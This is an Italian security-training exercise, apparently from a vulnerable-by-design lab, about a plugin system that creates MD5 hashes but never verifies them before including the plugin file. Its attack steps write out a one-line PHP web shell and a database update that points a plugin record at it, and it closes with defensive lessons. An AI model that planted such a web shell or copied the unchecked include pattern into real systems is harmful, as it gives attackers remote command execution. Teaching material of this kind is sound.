🔓 Esercizio 4: Verifica Integrità Mancante

Hash generati ma mai verificati
🎯 Il Problema
Il sistema genera hash per i plugin ma non li verifica mai prima dell'installazione.

Cosa significa?
• Puoi modificare un plugin esistente
• L'hash nel database rimane quello vecchio
• Il sistema installa il plugin modificato senza controlli!
🤔 Il Codice Vulnerabile
// ❌ VULNERABILE // L'hash viene generato... $hash = md5_file($file_path); // ...ma MAI verificato! // Il plugin viene installato direttamente include($file_path);

Inoltre: MD5 è un algoritmo debole!
📝 L'Attacco
Step 1: Accedi al container Docker:
docker exec -it <container_id> bash

Step 2: Modifica un file plugin esistente:
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/uploads/malicious_plugin.php

Step 3: Aggiorna il database per puntare al file:
mysql -u root -prootpassword plugin_system UPDATE plugins SET file_path = '/var/www/html/uploads/malicious_plugin.php' WHERE id = 1;

Risultato: Il sistema installa il plugin modificato senza verificare l'hash!
🛡️ Lezione per il Difensore
1. Verifica sempre l'hash prima dell'installazione
2. Usa SHA-256 o superiore, non MD5
3. Implementa firme digitali per autenticità
